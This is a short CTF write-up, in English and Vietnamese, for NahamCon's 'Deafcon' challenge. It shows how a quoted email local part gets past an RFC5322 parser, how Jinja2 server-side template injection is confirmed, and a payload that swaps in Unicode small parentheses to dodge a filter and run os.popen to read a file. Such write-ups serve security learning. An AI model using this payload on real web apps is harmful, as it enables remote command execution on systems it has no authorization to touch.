# nahamcon CTF - Deafcon

## Write up 
Name: sam

Email: "{{request.application['__globals__'].__builtins__.__import__﹙'os'﹚.popen﹙'cat flag.txt'﹚.read﹙﹚}}"@m.edu

Here the symbols that look like ( and ) are actually high-unicode characters: SMALL LEFT/RIGHT PARENTHESIS 0xFE59 and 0xFE5A

These get past the filter but must "turn into" regular parenthesis when the expression is evaluated. I'm not sure why.

The email syntax checker allows certain characters ONLY if the portion to the left of the @ is surrounded by double-quotes.

## Note nhẹ

### Quick Review
1. App cho 2 phần user input là `name` và `email`, sau khi submit website trả về trang pdf chứa name và email vừa cung cấp.
2. Test param name thì bị filter chỉ white list regex `/a-zA-Z0-9/`
3. Param email có email parser ở backed, ví dụ như `a<img src="//a.com">@gmail.com` sẽ không đúng format và trả về lỗi không tuân thủ `RFC5322`. Ngoài ra nó filter ngoặc tròn '(' và ')'

### Exploit
1. Để bypass email parser: `"a<we're good>"@a.com`, (phần username được bọc bằng dấu ngoặc kép bypass parser)
2. Thử tiếp: `"a{{7*'7'}}"@a.com` được `7777777` tức dính lỗi *SSTI*
3. Ta dùng unicode bypass filter '(' và ')' được payload sau:

```
Email: "{{request.application['__globals__'].__builtins__.__import__﹙'os'﹚.popen﹙'cat flag.txt'﹚.read﹙﹚}}"@a.com
```

 unicode: https://www.fileformat.info/search/google.htm?q=PARENTHESIS&domains=www.fileformat.info&sitesearch=www.fileformat.info&client=pub-6975096118196151&forid=1&channel=1657057343&ie=UTF-8&oe=UTF-8&cof=GALT%3A%23008000%3BGL%3A1%3BDIV%3A%23336699%3BVLC%3A663399%3BAH%3Acenter%3BBGC%3AFFFFFF%3BLBGC%3A336699%3BALC%3A0000FF%3BLC%3A0000FF%3BT%3A000000%3BGFNT%3A0000FF%3BGIMP%3A0000FF%3BFORID%3A11&hl=en
